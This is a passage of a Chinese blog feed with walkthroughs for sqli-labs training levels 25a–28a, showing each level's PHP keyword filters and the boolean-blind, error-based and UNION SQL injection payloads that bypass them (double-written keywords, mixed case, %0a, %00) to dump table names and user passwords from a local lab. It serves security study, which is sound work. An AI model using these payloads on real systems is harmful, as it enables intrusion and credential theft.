string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union\s+select/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过源码发现<strong>仅仅匹配了union select组合</strong>，<br>其余都未匹配，与Less28一样，用盲注的方式 ，**’)闭合**</p><p><code>1'</code><br><code>1') and 1=('1</code>闭合成功 <a name="U8oth"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断库长<span class="token number">1</span><span class="token string">')and length(database())=8--+返回正常,数据库长度为8逐一字符判断数据库名称1'</span><span class="token punctuation">)</span>and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token punctuation">)</span>--+返回正常,s<span class="token punctuation">..</span>.判断数据表长度<span class="token number">1</span><span class="token string">')and length((select group_concat(table_name) from  information_schema.tables where table_schema=database() ))=29--+正常回显数据表串起来长为29...逐一字符判断数据表名称1'</span><span class="token punctuation">)</span> and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">101</span>--+正常回显,e<span class="token punctuation">..</span>.判断列长<span class="token number">1</span><span class="token string">')and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20--+正常回显,列长串起来是为20...逐一字符判断字段名称1'</span><span class="token punctuation">)</span>and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">105</span>--+正常回显,i<span class="token punctuation">..</span>.逐一字符判断字段内容<span class="token number">1</span>'<span class="token punctuation">)</span>and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> from users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">68</span>--+显示正常,D<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less27a</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/less27a/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/less27a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out --.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out <span class="token comment">#.</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out <span class="token keyword">select</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/UNION/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out UNION<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/SELECT/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out SELECT<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out Union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out Select<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现闭合方式为<strong>双引号</strong>，其余与Less27相同</p><p><code>1"</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-27a\index.php</strong> on line <strong>37</strong></p></blockquote><p>双引号闭合</p><p><a name="nAsN4"></a></p><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><blockquote><p>uniOn<br>selEct<br>%0a：空格<br>00截断：%00</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称<span class="token number">0</span><span class="token string">"%0a uniOn %0a selEct %0a 1,2,database();%00爆破数据表名称0"</span>%0a uniOn %0a selEct %0a <span class="token number">1,2</span>,<span class="token punctuation">(</span>selEct %0a group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> %0a from %0a information_schema.tables %0a where %0a <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>%00 爆破字段名<span class="token number">0</span><span class="token string">"%0a uniOn %0a selEct %0a 1,2,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users');%00爆破字段内容0"</span>%0a uniOn %0a selEct %0a <span class="token number">1,2</span>,<span class="token punctuation">(</span>selEct<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">))</span>from%0ausers<span class="token punctuation">)</span><span class="token punctuation">;</span>%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less26a</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/less26a/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/less26a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out OR <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/and/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out AND <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out --<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out <span class="token comment">#</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\s]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\s]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/\\\\]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out slashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>less26a过滤的东西与less26一致，闭合方式为单引号’,<br>但是<strong>没有报错的回显</strong>&amp;#x20;<br>尝试<strong>布尔盲注</strong>解决该问题</p><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-26a\index.php</strong> on line <strong>36</strong></p></blockquote><p><code>1'aandnd'1'='1</code>返回正常<br><code>1'aandnd'1'='2</code>没有返回结果<br>用**单引号’**闭合 <a name="F1MU5"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p><a name="MvWqA"></a></p><h2 id="判断库长"><a href="#判断库长" class="headerlink" title="判断库长"></a>判断库长</h2><p>用二分法来确定库长<br><code>1'anandd(length(database())&lt;10)||'1</code>返回正常<br><code>1'anandd(length(database())&gt;5)||'1</code>返回正常<br><code>1'anandd(length(database())=8)||'1</code>返回正常<br>数据库长度为8 <a name="u8msB"></a></p><h2 id="逐一字符判断数据库名称"><a href="#逐一字符判断数据库名称" class="headerlink" title="逐一字符判断数据库名称"></a>逐一字符判断数据库名称</h2><p><code>1'anandd(ascii(substr((database()),1,1))=115)||'1</code>返回正常,s<br>… <a name="MZkCo"></a></p><h2 id="数据表长度"><a href="#数据表长度" class="headerlink" title="数据表长度"></a>数据表长度</h2><p><code>1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))&gt;20)||'1</code>正常回显<br><code>1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))&lt;30)||'1</code>正常回显<br><code>1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))=29)||'1</code>正常回显<br>数据表串起来长为29 <a name="TD0Ss"></a></p><h2 id="逐一字符判断数据表名称"><a href="#逐一字符判断数据表名称" class="headerlink" title="逐一字符判断数据表名称"></a>逐一字符判断数据表名称</h2><p><code>1'anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101)||'1</code>正常回显,e<br>… <a name="xiptE"></a></p><h2 id="判断列长"><a href="#判断列长" class="headerlink" title="判断列长"></a>判断列长</h2><p><code>1'anandd(length((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')))=20)||'1</code>正常回显,列长串起来是为20 <a name="Aqf5t"></a></p><h2 id="逐一字符判断字段名称"><a href="#逐一字符判断字段名称" class="headerlink" title="逐一字符判断字段名称"></a>逐一字符判断字段名称</h2><p><code>1'anandd(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')),1,1))=105)||'1</code>正常回显,i<br>… <a name="NdqVW"></a></p><h2 id="逐一字符判断字段内容"><a href="#逐一字符判断字段内容" class="headerlink" title="逐一字符判断字段内容"></a>逐一字符判断字段内容</h2><p><code>1'anandd(ascii(substr((select(group_concat(username,0x7e,passwoorrd))from(users)),1,1))=68)||'1</code>显示正常,D<br>…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less27</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out --.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out <span class="token comment">#.</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out <span class="token keyword">select</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/UNION/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out UNION<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/SELECT/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out SELECT<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out Union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out <span class="token keyword">select</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新增加<strong>union,select,UNION,SELECT,Union,Select</strong>被过滤。</p><blockquote><p>空格，换行——&gt; %0a</p></blockquote><p>and，or没有被过滤。<br>针对php这种弱类型语言，可以采用<strong>部分大写部分小写绕过</strong> <strong>selEct</strong></p><blockquote><p>All Your UNTON and SELEBCT belong to US.</p></blockquote><p><strong>union和select</strong>也被过滤了。 <a name="F1rLT"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-27\index.php</strong> on line <strong>36</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>用单引号闭合**’**</p><p><a name="l8hNe"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or'</span>爆破数据表名称<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x7e),1)or'</span><span class="token number">1</span>爆破字段名<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1)or'</span><span class="token number">1</span>爆破字段内容<span class="token number">1</span><span class="token string">'and%0aupdatexml(1,concat(0x7e,(selEct(group_concat(username,0x7e,password))from%0ausers),0x7e),1)||'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less26</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out OR <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/and/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out AND <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out --<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out <span class="token comment">#</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\s]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces空格和换行<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/\\\\]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out slashes/<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字符型注入，单引号闭合**’**</p><blockquote><p><strong>\s过滤了空格和换行，</strong><br><strong>解决and or可以双写或者用&amp;&amp;和||代替，</strong><br><strong>解决注释需要强行闭合逃逸，</strong><br><strong>需要空格的地方可以加上括号()或加号+</strong><br>and or ——&gt; &amp;&amp; ||</p><h1 id="–-——-gt-闭合逃逸"><a href="#–-——-gt-闭合逃逸" class="headerlink" title="–     ——> 闭合逃逸"></a>–     ——&gt; 闭合逃逸</h1><p>/s空格        ——&gt; 括号</p></blockquote><blockquote><p>All You Spaces and Comments belong to us.</p></blockquote><p>提示<strong>空格,and,注释</strong>被过滤 <a name="y70Tw"></a></p><h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-26\index.php</strong> on line <strong>36</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><ol><li>单引号闭合’</li><li>网站没有对报错信息进行过滤，我们可以使用基于报错的注入手段</li></ol><p><code>1 and 1=1 --+</code></p><blockquote><p>Hint: Your Input is Filtered with following result: 11=1</p></blockquote><p>发现and,空格和注释符号被过滤掉了</p><p><a name="vzgqw"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="Kcozu"></a></p><h2 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'</code> <a name="Pain7"></a></p><h2 id="爆破数据表名称"><a href="#爆破数据表名称" class="headerlink" title="爆破数据表名称"></a>爆破数据表名称</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1)||'</code> <a name="LKNid"></a></p><h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()aandnd(table_name='users'))),0x7e),1)||'</code> <a name="Clssj"></a></p><h2 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h2><p><code>-1'||updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,passwoorrd))from(users)),0x7e),1)||'</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less25a</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less25a/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less25a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out OR <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/AND/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out AND <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>用or变成oorr 或 用||代替or<br>用and变成aandnd 或 用&amp;&amp;替代and<br>注：在url中&amp;&amp;还有传参的作用如果需要使用&amp;&amp;需要进行url编码</p></blockquote><p>与Less25的区别是数字型注入</p><p><code>1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25a\index.php</strong> on line <strong>37</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">测试字段数<span class="token number">1</span> oorrder by <span class="token number">4</span>-- +没有第4列<span class="token number">1</span> oorrder by <span class="token number">3</span>-- +返回正常，有3个字段。检查回显点<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3-- +显示2，3是回显点爆破数据库名称<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>-- +爆破数据表<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from infoorrmation_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+爆破字段名称<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token 